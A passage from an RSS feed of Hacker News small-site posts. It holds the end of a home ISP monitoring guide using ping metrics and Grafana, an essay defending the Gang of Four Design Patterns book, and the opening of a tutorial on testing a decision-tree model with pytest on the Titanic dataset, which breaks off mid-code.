<li><code>ping_maximum_response_ms</code>: Max RTT for a packet</li>
<li><code>ping_percent_packet_loss</code>: % of packets lost on the way</li>
</ul>

<p>With just the above 3 metrics, we can answer questions like:</p>

<ul>
<li><strong>Is my ISP suffering an outage?</strong></li>
</ul>

<p>If yes, <code>ping_percent_packet_loss</code> should be unusually higher than normal. This usually happens when the ISP has routing is borked and that causes the packet to be routed in a less optimized way and as a side effect packet loss becomes one of the key metrics to measure here.</p>

<ul>
<li><strong>Is the upstream down?</strong></li>
</ul>

<p>If yes, <code>ping_average_response_ms</code> over a recent window should be higher than a window compared to a previous time range when things were fine and dandy. This can either mean 2 things: Either your ISP isn‚Äôt routing correctly to the said upstream or the CDN/Region where your upstream is faced an outage. This is quite a handy metric for me to monitor!</p>

<p>How many times have your friends complained ‚Äú<code>xyz.com</code> isn‚Äôt working for me‚Äù and when you try to load, it‚Äôs fine from your end? There are a lot of actors at play but <code>ping</code> is usually the most simple and quickest way to detect whether an issue persists or not. Of course, this doesn‚Äôt work for hosts which block ICMP packets altogether. They are not rare either, like <code>netflix.com</code> and <code>github.com</code> both block ICMP probes for example. For my use case, this wasn‚Äôt a major issue as I was able to still probe a decent amount of upstreams all over the world.</p>

<p>With that out of the way, let‚Äôs break the dashboard into different components and see what goes behind them.</p>

<h3 id="ping-response-panel">Ping Response Panel</h3>

<p><img src="https://mrkaran.dev/images/ping-row-panel3.png" alt=""></p>

<p>To plot this, simply choose a <code>Stat</code> visualisation with the query <code>ping_average_response_ms{url="$url"}</code>. Repeat this panel for the variable <code>$url</code> and you should be able to generate a nice row view like this.</p>

<p>Additonally you can choose Thresholds and the Unit to be displayed in the panel with these options.</p>

<p><img src="https://mrkaran.dev/images/ping-row-panel1.png" alt="">
<img src="https://mrkaran.dev/images/ping-row-panel2.png" alt=""></p>

<h3 id="ping-response-time-graph">Ping Response Time Graph</h3>

<p>The next graph is interesting, it lets me visualise the avg, min, max ping response time as well as the % packet loss plotted on the Y2 (right Y) axis.</p>

<p><img src="https://mrkaran.dev/images/floyd-ping.png" alt=""></p>

<h3 id="availability-panel">Availability Panel</h3>

<p>An interesting query to calculate uptime (just in the context whether the upstream is reachable) is:</p>
<div><pre>100 - avg_over_time(ping_percent_packet_loss[2m])</pre></div>
<p>Since I scrape metrics at an interval of <code>1m</code>(in order to not ping too frequently and disrupt my actual browsing experience), in this query I am averaging the data points for the metric <code>ping_percent_packet_loss</code> in a <code>[2m]</code> window.</p>

<p><img src="https://mrkaran.dev/images/ping-availability.png" alt=""></p>

<h3 id="dns-response-time-graph">DNS Response Time Graph</h3>

<p>We can similarly query the DNS response time by visualising the average response time for a DNS query. This might be useful only to people self-hosting their DNS servers.</p>

<p><img src="https://mrkaran.dev/images/telegraf-dns.png" alt=""></p>

<h2 id="conclusion">Conclusion</h2>

<p>So with a pretty simple and minimal OSS solution, I was able to setup monitoring for my home network! Over the last few days whenever my ISP had slightest of trouble, I can correlate it with my metrics! I mean I still can‚Äôt do anything about it cause the other person on ISP‚Äôs customer support is ‚ÄúDid you try rebooting your router‚Äù  ‚Äì the quintessential solution to all tech problems. Wish we could reboot this entire damn 2020 as well, but one could hope!</p>

<p>If you enjoyed reading this please share it in your circle! Shoot me for any questions on my Twitter <a href="https://twitter.com/mrkaran_">@mrkaran_</a> :)</p>

<p>Fin!</p>

			</div></div>]]>
            </description>
            <link>https://mrkaran.dev/posts/isp-monitoring/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524433</guid>
            <pubDate>Sat, 19 Sep 2020 02:39:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't hate the book because you don't use it]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24524046">thread link</a>) | @pietromenna
<br/>
September 18, 2020 | https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/ | <a href="https://web.archive.org/web/*/https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<h3>
  18 September 2020
</h3>


  <p>In a few months, I‚Äôll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I‚Äôm also starting to be disappointed by some of its negative aspects. While it doesn‚Äôt prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I‚Äôd like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we‚Äôll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as ‚Äúfoolish‚Äù does not end well.</p>
<p>While I disagree with the tone here, I‚Äôd like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it‚Äôs outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the ‚Äúflyweight‚Äù design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let‚Äôs get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn‚Äôt the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn‚Äôt. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let‚Äôs remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let‚Äôs not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father‚Äôs tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it‚Äôs directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don‚Äôt think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer ‚Äúcomposition over inheritance‚Äù. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you‚Äôre done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don‚Äôt see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: ‚ÄúDefine a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically‚Äù. Now, if we take a look at some modern technologies, doesn‚Äôt this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I‚Äôm not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I‚Äôm merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section ‚ÄúWhat to Expect from Design Patterns‚Äù, page 351:</p>
<blockquote>
<p>It‚Äôs possible to argue that this book hasn‚Äôt accomplished much. After all, it doesn‚Äôt present any algorithms or programming techniques that haven‚Äôt been used before. [‚Ä¶] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can‚Äôt offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don‚Äôt study design patterns in software, we won‚Äôt be able to improve them, and it‚Äôll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

</div></div>]]>
            </description>
            <link>https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524046</guid>
            <pubDate>Sat, 19 Sep 2020 01:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Test Machine Learning Code and Systems]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24523930">thread link</a>) | @7d7n
<br/>
September 18, 2020 | https://eugeneyan.com/writing/testing-ml/ | <a href="https://web.archive.org/web/*/https://eugeneyan.com/writing/testing-ml/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Two weeks ago, <a href="https://twitter.com/jeremyjordan" target="_blank">Jeremy</a> wrote a great post on <a href="https://www.jeremyjordan.me/testing-ml/" target="_blank">Effective Testing for Machine Learning Systems</a>. He distinguished between traditional software tests and machine learning (ML) tests; software tests check the <strong>written logic</strong> while ML tests check the <strong>learned logic</strong>.</p>

<p>ML tests can be further split into <strong>testing</strong> and <strong>evaluation</strong>. We‚Äôre familiar with ML <strong>evaluation</strong> where we train a model and evaluate its performance on an unseen validation set; this is done via metrics (e.g., accuracy, <a href="https://en.wikipedia.org/wiki/Receiver_operating_characteristic#Area_under_the_curve" target="_blank">Area under Curve of Receiver Operating Characteristic (AUC ROC)</a>) and visuals (e.g., <a href="https://eugeneyan.com/writing/recommender-systems-baseline-pytorch/#implementation-2-matrix-factorization-with-bias" target="_blank">precision-recall curve</a>).</p>

<p>On the other hand, ML <strong>testing</strong> involves checks on model behaviour. <strong>Pre-train tests</strong>‚Äîwhich can be run without trained parameters‚Äîcheck if our <em>written logic</em> is correct. For example, is classification probability between 0 to 1? <strong>Post-train tests</strong> check if the <em>learned logic</em> is expected. For example, on the <a href="https://www.kaggle.com/c/titanic/data" target="_blank">Titanic dataset</a>, we should expect females to have a higher survival probability (relative to males).</p>

<p><img src="https://eugeneyan.com/assets/testing-ml-flow.jpg" title="Workflow for testing machine learning" alt="Workflow for testing machine learning"></p>
<p>Workflow for testing machine learning (<a href="https://www.jeremyjordan.me/testing-ml/" target="_blank">source</a>)</p>

<p>Taken together, here‚Äôs how the workflow might look like. To complement this, we‚Äôll implement a machine learning model and run the following tests on it:</p>
<ul>
  <li><a href="#pre-train-tests-to-ensure-correct-implementation">Pre-train tests to ensure correct implementation</a></li>
  <li><a href="#post-train-tests-to-ensure-expected-learned-behaviour">Post-train tests to ensure expected learned behaviour</a></li>
  <li><a href="#model-evaluation-to-ensure-satisfactory-performance">Evaluation to ensure satisfactory model performance</a></li>
</ul>

<blockquote>
  <p>Follow along with the code in this Github repository: <a href="https://github.com/eugeneyan/testing-ml" target="_blank"><code>testing-ml</code></a></p>
</blockquote>

<h2 id="setting-up-the-context-algorithm-and-data">Setting up the context (algorithm and data)</h2>

<p>Before we can do ML testing, we‚Äôll need an <strong>algorithm and some data</strong>. Our algorithm will be a <a href="https://numpy.org/" target="_blank"><code>numpy</code></a> implementation of <a href="https://github.com/eugeneyan/testing-ml/blob/master/src/tree/decision_tree.py" target="_blank"><code>DecisionTree</code></a> which predicts a probability for binary classification. (<a href="#try-it-for-yourself-and-break-something">Extensions to make it support regression welcome!</a>).</p>

<p>To run our tests, we‚Äôll use the <a href="https://www.kaggle.com/c/titanic/data" target="_blank">Titanic dataset</a>. This tiny data set (~900 rows, 10 features) makes for fast testing (when model training is involved) and allows us to iterate quickly. (As part of performance evaluation, we run <code>fit()</code> and <code>predict()</code> hundreds of times to get the 99th percentile timing.) The simplicity and familiarity of the data also makes it easier to discuss the post-train (i.e., learned logic) tests.</p>

<div><div><pre><code>+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------+
| PassengerId | Survived | Pclass | Name                                    | Sex    | Age | SibSp | Parch | Ticket    |    Fare | Cabin | Embarked |
+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------|
|           1 |        0 |      3 | Braund, Mr. Owen Harris                 | male   |  22 |     1 |     0 | A/5 21171 |    7.25 | nan   | S        |
|           2 |        1 |      1 | Cumings, Mrs. John Bradley (Florence... | female |  38 |     1 |     0 | PC 17599  | 71.2833 | C85   | C        |
|           3 |        1 |      3 | Heikkinen, Miss. Laina                  | female |  26 |     0 |     0 | STON/O2.  |   7.925 | nan   | S        |
|           4 |        1 |      1 | Futrelle, Mrs. Jacques Heath (Lily M... | female |  35 |     1 |     0 | 113803    |    53.1 | C123  | S        |
|           5 |        0 |      3 | Allen, Mr. William Henry                | male   |  35 |     0 |     0 | 373450    |    8.05 | nan   | S        |
|           6 |        0 |      3 | Moran, Mr. James                        | male   | nan |     0 |     0 | 330877    |  8.4583 | nan   | Q        |
|           7 |        0 |      1 | McCarthy, Mr. Timothy J                 | male   |  54 |     0 |     0 | 17463     | 51.8625 | E46   | S        |
|           8 |        0 |      3 | Palsson, Master. Gosta Leonard          | male   |   2 |     3 |     1 | 349909    |  21.075 | nan   | S        |
|           9 |        1 |      3 | Johnson, Mrs. Oscar W (Elisabeth Vil... | female |  27 |     0 |     2 | 347742    | 11.1333 | nan   | S        |
|          10 |        1 |      2 | Nasser, Mrs. Nicholas (Adele Achem)     | female |  14 |     1 |     0 | 237736    | 30.0708 | nan   | C        |
+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------+
</code></pre></div></div>
<p>If you're unfamiliar with the Titanic dataset, here's how it looks like (scroll to the right).</p>

<h2 id="adopting-testing-habits-from-software-engineering">Adopting testing habits from software engineering</h2>

<p>We‚Äôll adopt some good habits from software engineering. We won‚Äôt go through them in detail here though it was previously covered in another <a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/" target="_blank">post</a>:</p>
<ul>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#write-some-unit-tests-theyre-our-safety-harness" target="_blank">Unit test</a> fixture reuse, exceptions testing, etc with <a href="https://docs.pytest.org/en/latest/" target="_blank"><code>pytest</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#check-for-coverage-how-extensive-are-our-tests" target="_blank">Code coverage</a> with <a href="https://coverage.readthedocs.io/en/coverage-5.2.1/" target="_blank"><code>Coverage.py</code></a> and <a href="https://pytest-cov.readthedocs.io/en/latest/" target="_blank"><code>pytest-cov</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#lint-to-ensure-consistency-across-projects" target="_blank">Linting</a> to ensure code consistency with <a href="https://www.pylint.org/" target="_blank"><code>pylint</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#check-for-type-errors-to-prevent-them" target="_blank">Type checking</a> to verify type correctness with <a href="http://mypy-lang.org/" target="_blank"><code>mypy</code></a></li>
</ul>

<p>(Note: The tests below won‚Äôt include type hints though the <a href="https://github.com/eugeneyan/testing-ml/blob/master/src/tree/decision_tree.py#L16" target="_blank">implementation code</a> does.)</p>

<h2 id="pre-train-tests-to-ensure-correct-implementation">Pre-train tests to ensure correct implementation</h2>

<p>In pre-train tests, we want to <strong>catch errors in our implementation</strong> (i.e., written logic) before training an erroneous model. We can run these tests without a fully trained model.</p>

<p>First, we‚Äôll test our functions of <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#Gini_impurity" target="_blank">Gini impurity</a> and <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#Information_gain" target="_blank">Gini gain</a>. These will be used to <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#General" target="_blank">split the data</a> and grow our decision tree.</p>

<div><div><pre><code><span>def</span> <span>test_gini_impurity</span><span>():</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.219</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.375</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.469</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.500</span>


<span>def</span> <span>test_gini_gain</span><span>():</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.5</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.125</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.125</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.0</span>
</code></pre></div></div>

<p>Next, we‚Äôll check if the model prediction shape is expected. We should have the same number of rows as the input features.</p>

<div><div><pre><code><span>def</span> <span>test_dt_output_shape</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>X_test</span><span>,</span> <span>y_test</span> <span>=</span> <span>dummy_titanic</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
    <span>pred_train</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
    <span>pred_test</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_test</span><span>)</span>

    <span>assert</span> <span>pred_train</span><span>.</span><span>shape</span> <span>==</span> <span>(</span><span>X_train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],),</span> <span>'DecisionTree output should be same as training labels.'</span>
    <span>assert</span> <span>pred_test</span><span>.</span><span>shape</span> <span>==</span> <span>(</span><span>X_test</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],),</span> <span>'DecisionTree output should be same as testing labels.'</span>
</code></pre></div></div>

<p>We‚Äôll also want to check the output ranges. Given that we‚Äôre predicting probabilities, we should expect the output to range from 0 to 1 inclusive.</p>

<div><div><pre><code><span>def</span> <span>test_dt_output_range</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>X_test</span><span>,</span> <span>y_test</span> <span>=</span> <span>dummy_titanic</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
    <span>pred_train</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
    <span>pred_test</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_test</span><span>)</span>

    <span>assert</span> <span>(</span><span>pred_train</span> <span>&lt;=</span> <span>1</span><span>).</span><span>all</span><span>()</span> <span>&amp;</span> <span>(</span><span>pred_train</span> <span>&gt;=</span> <span>0</span><span>).</span><span>all</span><span>(),</span> <span>'Decision tree output should range from 0 to 1 inclusive'</span>
    <span>assert</span> <span>(</span><span>pred_test</span> <span>&lt;=</span> <span>1</span><span>).</span><span>all</span><span>()</span> <span>&amp;</span> <span>(</span><span>pred_test</span> <span>&gt;=</span> <span>0</span><span>).</span><span>all</span><span>(),</span> <span>'Decision tree output should range from 0 to 1 inclusive'</span>
</code></pre></div></div>

<p>Here, we‚Äôll check for test set leakage (i.e., duplicate rows in train/test splits) by concatenating train and test data, dropping duplicates, and checking the number of rows. (Note: Other leakages include <a href="https://www.fast.ai/2017/11/13/validation-sets/#time-series" target="_blank">temporal leaks</a> and <a href="https://en.wikipedia.org/wiki/Leakage_(machine_learning)#Feature_leakage" target="_blank">feature leaks</a>; we won‚Äôt cover them here.)</p>

<div><div><pre><code><span>def</span> <span>test_data_leak_in_test_data</span><span>(</span><span>dummy_titanic_df</span><span>):</span>
    <span>train</span><span>,</span> <span>test</span> <span>=</span> <span>dummy_titanic_df</span>

    <span>concat_df</span> <span>=</span> <span>pd</span><span>.</span><span>concat</span><span>([</span><span>train</span><span>,</span> <span>test</span><span>])</span>
    <span>concat_df</span><span>.</span><span>drop_duplicates</span><span>(</span><span>inplace</span><span>=</span><span>True</span><span>)</span>

    <span>assert</span> <span>concat_df</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span> <span>==</span> <span>train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span> <span>+</span> <span>test</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span>
</code></pre></div></div>

<p>Given perfectly separable data and unlimited depth, our decision tree should be able to ‚Äúmemorise‚Äù the training data and <em><a href="https://en.wikipedia.org/wiki/Overfitting" target="_blank">overfit</a> completely</em>. In other words, if we train <em>and</em> evaluate on the training data, we should get 100% accuracy. (Note: the Titanic data isn‚Äôt perfectly separable so we‚Äôll create a small data sample for this.)</p>

<div><div><pre><code><span>@</span><span>pytest</span><span>.</span><span>fixture</span>
<span>def</span> <span>dummy_feats_and_labels</span><span>():</span>
    <span>feats</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([[</span><span>0.7057</span><span>,</span> <span>-</span><span>5.4981</span><span>,</span> <span>8.3368</span><span>,</span> <span>-</span><span>2.8715</span><span>],</span>
                      <span>[</span><span>2.4391</span><span>,</span> <span>6.4417</span><span>,</span> <span>-</span><span>0.80743</span><span>,</span> <span>-</span><span>0.69139</span><span>],</span>
                      <span>[</span><span>-</span><span>0.2062</span><span>,</span> <span>9.2207</span><span>,</span> <span>-</span><span>3.7044</span><span>,</span> <span>-</span><span>6.8103</span><span>],</span>
                      <span>[</span><span>4.2586</span><span>,</span> <span>11.2962</span><span>,</span> <span>-</span><span>4.0943</span><span>,</span> <span>-</span><span>4.3457</span><span>],</span>
                      <span>[</span><span>-</span><span>2.343</span><span>,</span> <span>12.9516</span><span>,</span> <span>3.3285</span><span>,</span> <span>-</span><span>5.9426</span><span>],</span>
                      <span>[</span><span>-</span><span>2.0545</span><span>,</span> <span>-</span><span>10.8679</span><span>,</span> <span>9.4926</span><span>,</span> <span>-</span><span>1.4116</span><span>],</span>
                      <span>[</span><span>2.2279</span><span>,</span> <span>4.0951</span><span>,</span> <span>-</span><span>4.8037</span><span>,</span> <span>-</span><span>2.1112</span><span>],</span>
                      <span>[</span><span>-</span><span>6.1632</span><span>,</span> <span>8.7096</span><span>,</span> <span>-</span><span>0.21621</span><span>,</span> <span>-</span><span>3.6345</span><span>],</span>
                      <span>[</span><span>0.52374</span><span>,</span> <span>3.644</span><span>,</span> <span>-</span><span>4.0746</span><span>,</span> <span>-</span><span>1.9909</span><span>],</span>
                      <span>[</span><span>1.5077</span><span>,</span> <span>1.9596</span><span>,</span> <span>-</span><span>3.0584</span><span>,</span> <span>-</span><span>0.12243</span><span>]</span>
                      <span>])</span>
    <span>labels</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>])</span>
    <span>return</span> <span>feats</span><span>,</span> <span>labels</span>

<span>def</span> <span>test_dt_overfit</span><span>(</span><span>dummy_feats_and_labels</span><span>):</span>
    <span>feats</span><span>,</span> <span>labels</span> <span>=</span> <span>dummy_feats_and_labels</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>feats</span><span>,</span> <span>labels</span><span>)</span>
    <span>pred</span> <span>=</span> <span>np</span><span>.</span><span>round</span><span>(</span><span>dt</span><span>.</span><span>predict</span><span>(</span><span>feats</span><span>))</span>

    <span>assert</span> <span>np</span><span>.</span><span>array_equal</span><span>(</span><span>labels</span><span>,</span> <span>pred</span><span>),</span> <span>'DecisionTree should fit data perfectly and prediction should == labels.'</span>
</code></pre></div></div>

<p>Lastly, we check if increasing tree depth leads to increased accuracy and AUC ROC on <em>training</em> data (though it‚Äôll overfit and perform poorly on <em>validation</em> data). In the test below, we fit trees of depth one to 10 and ensure training accuracy and AUC increases consistently.</p>

<div><div><pre><code><span>def</span> <span>test_dt_increase_acc</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>_</span><span>,</span> <span>_</span> <span>=</span> <span>dummy_titanic</span>

    <span>acc_list</span> <span>=</span> <span>[]</span>
    <span>auc_list</span> <span>=</span> <span>[]</span>
    <span>for</span> <span>depth</span> <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>10</span><span>):</span>
        <span>dt</span> <span>=</span> <span>DecisionTree</span><span>(</span><span>depth_limit</span><span>=</span><span>depth</span><span>)</span>
        <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
